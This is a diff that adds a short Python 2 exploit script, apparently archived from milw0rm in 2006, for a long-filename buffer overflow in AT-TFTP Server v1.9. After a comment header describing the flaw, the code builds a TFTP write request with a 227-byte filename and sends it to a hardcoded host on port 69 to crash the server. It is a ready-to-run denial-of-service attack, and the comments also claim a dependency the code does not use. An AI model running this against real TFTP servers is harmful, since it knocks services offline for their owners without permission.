@@ -1,0 +1,38 @@
+#!/usr/bin/python
+# SUMMARY:
+# AT-TFTP Server is a Freeware TFTP server for Windows 9x/NT/XP.
+# (http://www.alliedtelesyn.co.uk/en-gb/support/downloads/tools.asp)
+# It provides an implementation of the TFTPv2 protocol.
+# A vulnerability has been identified in TFTP Server AT-TFTP Server v1.9, which 
+# could be exploited by remote or local attackers to execute arbitrary commands 
+# or cause a denial of service. This flaw is due to a buffer overflow error when 
+# handling an overly long file name (more than 227 bytes) passed to a "GET" or "PUT" 
+# command, which could be exploited by malicious users to compromise a vulnerable 
+# system or crash an affected application.
+# EXPLOIT:
+# Buffer Overflow (Long filename) Vulnerability Exploit
+# This is just a DoS exploiting code
+# Tested on Windows xp SP2
+#
+# Requires python and impacket
+#
+# Coded by Liu Qixu Of NCNIPC
+
+import socket
+import sys
+
+host = '192.168.1.11'
+port = 69
+
+try:
+   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+except:
+   print "socket() failed"
+   sys.exit(1)
+
+filename = "A" * 227
+mode = "netascii"
+data = "\x00\x02" + filename + "\0" + mode + "\0"
+s.sendto(data, (host, port))
+
+# milw0rm.com [2006-11-27]
